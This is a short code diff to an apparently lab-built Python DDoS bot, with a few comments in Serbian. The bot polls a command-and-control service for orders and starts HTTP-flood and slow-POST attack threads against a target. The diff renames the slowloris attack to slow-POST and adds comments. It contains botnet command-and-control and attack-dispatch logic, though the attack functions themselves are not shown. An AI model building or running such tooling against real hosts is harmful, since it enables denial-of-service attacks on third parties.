@@ -3,9 +3,9 @@ import uuid
 import threading  
 import requests  
 
-from attacks import run_http_flood, run_slowloris
+from attacks import run_http_flood, run_slowpost
 
-C2_POLL_URL = "http://c2:5001/api/bot/poll" # c2 je ime compose servisa
+C2_POLL_URL = "http://c2:5001/api/bot/poll" # c2 je ime compose servisa, sevisi mogu medjusobno da kom ako su u istom compsose.yaml
  
 POLL_INTERVAL = 2 
 
@@ -60,7 +60,7 @@ def start_attack(attack, stop_event, stats):
             t.start()
             threads.append(t)
 
-    elif attack["attack_type"] == "slowloris":
+    elif attack["attack_type"] == "slowpost":
 
         connections = params["connections_per_bot"]
         interval = params["keepalive_interval_seconds"]
@@ -68,7 +68,7 @@ def start_attack(attack, stop_event, stats):
         for _ in range(connections):
 
             t = threading.Thread(
-                target=run_slowloris,
+                target=run_slowpost,
                 args=(target_host, interval, stop_event, stats)
             )
 
@@ -79,7 +79,7 @@ def start_attack(attack, stop_event, stats):
 
 
 def main():
-    
+
     bot_id = str(uuid.uuid4())
 
     stop_event = threading.Event()
@@ -98,7 +98,7 @@ def main():
 
             stop_current_attack(stop_event, attack_threads)
 
-            stop_event = threading.Event()
+            stop_event = threading.Event() # reasign
 
             stats["active_connections"] = 0
             stats["requests_sent"] = 0
